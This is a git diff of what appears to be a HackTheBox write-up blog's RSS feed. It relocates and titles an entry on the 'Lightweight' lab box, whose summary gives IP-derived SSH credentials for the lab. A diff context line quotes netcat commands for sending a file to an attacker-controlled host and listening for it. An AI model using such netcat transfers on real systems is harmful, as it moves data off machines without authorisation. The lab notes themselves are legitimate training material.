@@ -12,19 +12,6 @@
     
     <item>
       <title></title>
-      <link>/hackthebox/boxes/lightweight/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/hackthebox/boxes/lightweight/</guid>
-      <description>Lightweight has some kind of waf in place that&amp;rsquo;s prevents brute forcing of any kind. It creates a user based on your IP address. that will grant us access. once somebody visits the website it creates a username &amp;amp; password based on that person IP address, creepy.
-initially you will need to change your hosts file lightweight.htb
-ssh ippaddr@lightweight.htb password = ipaddress
-passwd to change password once logged in.
-Linux version 3.</description>
-    </item>
-    
-    <item>
-      <title></title>
       <link>/hackthebox/challenges/bloodhound/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
@@ -137,6 +124,19 @@ upload = nc -w 3 [your_ip] 1337 &amp;lt; file.txt listener = nc -lp 1337 &amp;gt
       <guid>/hackthebox/github/hugopowershell/</guid>
       <description>POWERSHELL Overview, how to install Hugo and how to set up the web pages using GitHub as repository in a WINDOWS environment. Since most of the commands have a Linux counterpart you could follow.
 First off id like to say I wish there was a way to do this with less command line. I initially tried setting it up on GITLAB but I just couldn&amp;rsquo;t find the material I need to do within windows.</description>
+    </item>
+    
+    <item>
+      <title>LightWeight</title>
+      <link>/hackthebox/boxes/lightweight/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/hackthebox/boxes/lightweight/</guid>
+      <description>Lightweight has some kind of waf in place that&amp;rsquo;s prevents brute forcing of any kind. It creates a user based on your IP address. that will grant us access. once somebody visits the website it creates a username &amp;amp; password based on that person IP address, creepy.
+initially you will need to change your hosts file lightweight.htb
+ssh ippaddr@lightweight.htb password = ipaddress
+passwd to change password once logged in.
+Linux version 3.</description>
     </item>
     
     <item>
